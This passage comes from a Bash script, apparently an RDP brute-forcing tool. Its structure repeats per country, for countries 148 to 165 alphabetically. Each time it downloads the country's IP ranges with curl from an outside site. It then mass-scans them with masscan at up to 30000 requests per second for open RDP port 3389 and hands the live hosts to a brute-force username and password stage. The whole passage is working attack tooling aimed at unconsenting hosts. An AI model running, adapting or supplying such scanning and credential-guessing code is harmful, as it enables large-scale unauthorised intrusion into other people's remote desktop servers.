echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "148" ]; then
curl http://ipdiapazon.16mb.com/Peru.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "149" ]; then
curl http://ipdiapazon.16mb.com/Philippines.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "150" ]; then
curl http://ipdiapazon.16mb.com/Poland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "151" ]; then
curl http://ipdiapazon.16mb.com/Portugal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "152" ]; then
curl http://ipdiapazon.16mb.com/Puerto_rico.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "153" ]; then
curl http://ipdiapazon.16mb.com/Qatar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "154" ]; then
curl http://ipdiapazon.16mb.com/Romania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "155" ]; then
curl http://ipdiapazon.16mb.com/Russia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g" |sed '$d'>list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "156" ]; then
curl http://ipdiapazon.16mb.com/Rwanda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "157" ]; then
curl http://ipdiapazon.16mb.com/Saint.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "158" ]; then
curl http://ipdiapazon.16mb.com/Saint_lucia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "159" ]; then
curl http://ipdiapazon.16mb.com/Samoa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "160" ]; then
curl http://ipdiapazon.16mb.com/San_marino.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "161" ]; then
curl http://ipdiapazon.16mb.com/Saudi_arabia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "162" ]; then
curl http://ipdiapazon.16mb.com/Senegal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "163" ]; then
curl http://ipdiapazon.16mb.com/Serbia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "164" ]; then
curl http://ipdiapazon.16mb.com/Seychelles.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "165" ]; then
curl http://ipdiapazon.16mb.com/Sierra_leone.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
